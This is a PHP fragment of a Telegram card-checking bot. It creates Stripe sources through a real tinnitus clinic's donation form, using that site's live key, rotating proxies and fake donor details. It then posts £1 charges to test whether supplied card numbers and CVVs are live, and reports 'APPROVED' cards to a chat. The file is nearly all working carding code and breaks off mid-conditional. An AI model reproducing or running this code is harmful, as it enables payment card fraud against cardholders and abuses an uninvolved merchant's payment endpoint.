preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Proxys]===//////////////

$rp1 = array(
  1 => 'user-rotate:pass',
  2 => 'user-rotate:pass',
  3 => 'user-rotate:pass',
  4 => 'user-rotate:pass',
  5 => 'user-rotate:pass',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

////////////////////////////////////////////

////////////////////////////==============[Proxy Section]===============//////////////////////////////

$url = "https://api.ipify.org/";   

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = "Proxy Live!";
}
if (empty($ip1)){
$ip = "Proxy Live!";
}

//echo '[ IP: '.$ip.' ] ';
 
 /////////////////////////////// 1st REQ /////////////////////////////////////////////

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/sources',
'scheme: https',
'accept: application/json',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,fr;q=0.5,pt;q=0.4',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.40 Safari/537.36 Edg/87.0.664.24',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=Lund+Lele&owner[email]='.$email.'&owner[address][postal_code]=10080&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e26d77bc-f543-4d8e-bf09-22bfdddc07e406905e&muid=b16d31bd-0866-4e8a-a81d-a0d4a008b51d0b621f&sid=51d9c61b-93e9-49cb-a27c-7ed47809f147217eeb&pasted_fields=number&payment_user_agent=stripe.js%2F06b5a426%3B+stripe-js-v3%2F06b5a426&time_on_page=40085&referrer=https%3A%2F%2Fhashirtinnitusclinic.com%2F&key=pk_live_51HK2guArPU5UzCG0mrvfTATaGeVynoPT1OOSL001wygTpQbI00Yxwu6ZKGKhj8jwkQQw2XjcGIdKYcjBEojxBa2O00N5tPlomO');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# --------------- [2nd Req] ------------ #

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://hashirtinnitusclinic.com/wp-json/wpsp/v2/customer');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: hashirtinnitusclinic.com',
'method: POST',
'path: /wp-json/wpsp/v2/customer',
'scheme: https',
'accept: */*',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,fr;q=0.5,pt;q=0.4',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: _ga=GA1.2.1228757827.1610704347; __stripe_mid=b16d31bd-0866-4e8a-a81d-a0d4a008b51d0b621f; _gid=GA1.2.810866087.1610816686; _gat_gtag_UA_168059679_1=1; trustedsite_visit=1; __stripe_sid=cd8730e0-3cac-4b6f-92f2-4df245081657ff4fcd',
'origin: https://hashirtinnitusclinic.com',
'referer: https://hashirtinnitusclinic.com/icbt-for-tinnitus/donate/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.40 Safari/537.36 Edg/87.0.664.24',
'x-requested-with: XMLHttpRequest',
));
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_values%5Bsimpay_email%5D='.$email.'&form_values%5Bsimpay_field%5D%5Bsimpay-form-1813-field-6%5D=AccuProbe+Solutions&form_values%5Bsimpay_customer_name%5D=Lund+Lele&form_values%5Bsimpay_custom_amount%5D=1.00&form_values%5Bsimpay_form_id%5D=1813&form_values%5Bsimpay_amount%5D=100&form_values%5B_wpnonce%5D=2372c69834&form_values%5B_wp_http_referer%5D=%2Ficbt-for-tinnitus%2Fdonate%2F&form_data%5BformId%5D=1813&form_data%5BformInstance%5D=0&form_data%5Bquantity%5D=1&form_data%5BisValid%5D=true&form_data%5BstripeParams%5D%5Bkey%5D=pk_live_51HK2guArPU5UzCG0mrvfTATaGeVynoPT1OOSL001wygTpQbI00Yxwu6ZKGKhj8jwkQQw2XjcGIdKYcjBEojxBa2O00N5tPlomO&form_data%5BstripeParams%5D%5Bsuccess_url%5D=https%3A%2F%2Fhashirtinnitusclinic.com%2Fpayment-confirmation%2F%3Fform_id%3D1813&form_data%5BstripeParams%5D%5Berror_url%5D=https%3A%2F%2Fhashirtinnitusclinic.com%2Fpayment-failed%2F%3Fform_id%3D1813&form_data%5BstripeParams%5D%5Blocale%5D=auto&form_data%5BstripeParams%5D%5Bcountry%5D=GB&form_data%5BstripeParams%5D%5Bcurrency%5D=GBP&form_data%5BstripeParams%5D%5BelementsLocale%5D=auto&form_data%5BstripeParams%5D%5Bamount%5D=100&form_data%5BisTestMode%5D=false&form_data%5BisSubscription%5D=false&form_data%5BisTrial%5D=false&form_data%5BhasCustomerFields%5D=true&form_data%5BhasPaymentRequestButton%5D%5Bid%5D=simpay-1813-payment-request-button-4&form_data%5BhasPaymentRequestButton%5D%5Btype%5D=default&form_data%5BhasPaymentRequestButton%5D%5BrequestPayerName%5D=false&form_data%5BhasPaymentRequestButton%5D%5BrequestPayerEmail%5D=true&form_data%5BhasPaymentRequestButton%5D%5BrequestShipping%5D=false&form_data%5BhasPaymentRequestButton%5D%5BshippingOptions%5D%5B0%5D%5Bid%5D=0&form_data%5BhasPaymentRequestButton%5D%5BshippingOptions%5D%5B0%5D%5Blabel%5D=Default&form_data%5BhasPaymentRequestButton%5D%5BshippingOptions%5D%5B0%5D%5Bamount%5D=0&form_data%5BhasPaymentRequestButton%5D%5Bi18n%5D%5BplanLabel%5D=Subscription&form_data%5BhasPaymentRequestButton%5D%5Bi18n%5D%5BtotalLabel%5D=Total&form_data%5BhasPaymentRequestButton%5D%5Bi18n%5D%5BtaxLabel%5D=Tax%3A+%25s%25&form_data%5BhasPaymentRequestButton%5D%5Bi18n%5D%5BcouponLabel%5D=Coupon%3A+%25s&form_data%5BhasPaymentRequestButton%5D%5Bi18n%5D%5BsetupFeeLabel%5D=Setup+Fee&form_data%5Bamount%5D=1&form_data%5BsetupFee%5D=0&form_data%5BminAmount%5D=1&form_data%5BtotalAmount%5D=&form_data%5BsubMinAmount%5D=0&form_data%5BplanIntervalCount%5D=0&form_data%5BtaxPercent%5D=0&form_data%5BfeePercent%5D=0&form_data%5BfeeAmount%5D=0&form_data%5BstripeErrorMessages%5D%5Binvalid_number%5D=The+card+number+is+not+a+valid+credit+card+number.&form_data%5BstripeErrorMessages%5D%5Binvalid_expiry_month%5D=The+cards+expiration+month+is+invalid.&form_data%5BstripeErrorMessages%5D%5Binvalid_expiry_year%5D=The+cards+expiration+year+is+invalid.&form_data%5BstripeErrorMessages%5D%5Binvalid_cvc%5D=The+cards+security+code+is+invalid.&form_data%5BstripeErrorMessages%5D%5Bincorrect_number%5D=The+card+number+is+incorrect.&form_data%5BstripeErrorMessages%5D%5Bincomplete_number%5D=The+card+number+is+incomplete.&form_data%5BstripeErrorMessages%5D%5Bincomplete_cvc%5D=The+cards+security+code+is+incomplete.&form_data%5BstripeErrorMessages%5D%5Bincomplete_expiry%5D=The+cards+expiration+date+is+incomplete.&form_data%5BstripeErrorMessages%5D%5Bexpired_card%5D=The+card+has+expired.&form_data%5BstripeErrorMessages%5D%5Bincorrect_cvc%5D=The+cards+security+code+is+incorrect.&form_data%5BstripeErrorMessages%5D%5Bincorrect_zip%5D=The+cards+zip+code+failed+validation.&form_data%5BstripeErrorMessages%5D%5Binvalid_expiry_year_past%5D=The+cards+expiration+year+is+in+the+past&form_data%5BstripeErrorMessages%5D%5Bcard_declined%5D=The+card+was+declined.&form_data%5BstripeErrorMessages%5D%5Bprocessing_error%5D=An+error+occurred+while+processing+the+card.&form_data%5BstripeErrorMessages%5D%5Binvalid_request_error%5D=Unable+to+process+this+payment%2C+please+try+again+or+use+alternative+method.&form_data%5BstripeErrorMessages%5D%5Bemail_invalid%5D=Invalid+email+address%2C+please+correct+and+try+again.&form_data%5BminCustomAmountError%5D=The+minimum+amount+allowed+is+%26pound%3B1.00&form_data%5BsubMinCustomAmountError%5D=The+minimum+amount+allowed+is+%26pound%3B0.00&form_data%5BpaymentButtonText%5D=Pay+with+Card&form_data%5BpaymentButtonLoadingText%5D=Please+Wait...&form_data%5BcompanyName%5D=&form_data%5BsubscriptionType%5D=disabled&form_data%5BplanInterval%5D=0&form_data%5BcheckoutButtonText%5D=Pay+%7B%7Bamount%7D%7D&form_data%5BcheckoutButtonLoadingText%5D=Please+Wait...&form_data%5BdateFormat%5D=mm%2Fdd%2Fyy&form_data%5BformDisplayType%5D=embedded&form_data%5BpaymentMethods%5D%5B0%5D%5Bid%5D=card&form_data%5BpaymentMethods%5D%5B0%5D%5Bname%5D=Card&form_data%5BpaymentMethods%5D%5B0%5D%5Bnicename%5D=Credit+Card&form_data%5BpaymentMethods%5D%5B0%5D%5Bflow%5D=none&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aed&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=afn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=all&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=amd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ang&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aoa&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ars&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aud&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=awg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=azn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bam&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bbd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bdt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bgn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bhd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bif&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bob&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=brl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bsd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=btc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=btn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bwp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=byr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cdf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=chf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=clp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cny&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=crc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cuc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cup&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cve&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=czk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=djf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dkk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=egp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ern&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=etb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=eur&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=fjd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=fkp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gbp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gel&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ggp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ghs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gip&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gnf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gtq&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hkd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hnl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hrk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=htg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=huf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=idr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ils&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=imp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=inr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=iqd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=irr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=isk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jep&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jod&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jpy&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kes&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kgs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=khr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kmf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kpw&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=krw&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kwd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kzt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lak&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lbp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lkr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lrd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lsl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mdl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mga&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mkd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mmk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mnt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mro&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mur&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mvr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mwk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mxn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=myr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mzn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ngn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nio&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nok&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=npr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=omr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pab&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pen&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pgk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=php&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pkr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pln&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=prb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pyg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=qar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rmb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ron&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rsd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rub&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rwf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sbd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=scr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sdg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sek&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sgd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=shp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sll&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sos&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=srd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ssp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=std&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=syp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=szl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=thb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tjs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tmt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=top&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=try&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ttd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=twd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tzs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uah&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ugx&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=usd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uyu&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uzs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vef&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vuv&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=wst&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xaf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xcd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xof&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xpf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=yer&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=zar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=zmw&form_data%5BpaymentMethods%5D%5B0%5D%5Brecurring%5D=true&form_data%5BpaymentMethods%5D%5B0%5D%5Bstripe_checkout%5D=true&form_data%5BpaymentMethods%5D%5B0%5D%5Binternal_docs%5D=&form_data%5BpaymentMethods%5D%5B0%5D%5Bexternal_docs%5D=https%3A%2F%2Fstripe.com%2Fpayments%2Fpayment-methods-guide%23cards&form_data%5BcustomAmount%5D=1&form_data%5BfinalAmount%5D=1.00&form_data%5BcouponCode%5D=&form_data%5Bdiscount%5D=0&form_id=1813&source_id='.$id.'');

$result2 = curl_exec($ch);
$cvc_check = trim(strip_tags(getStr($result2,'"cvc_check":"','"')));
 $info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

 if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b> 『 ★ CVV LIVE ★ 』 『 ★ Insufficient Funds ★ 』 </b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
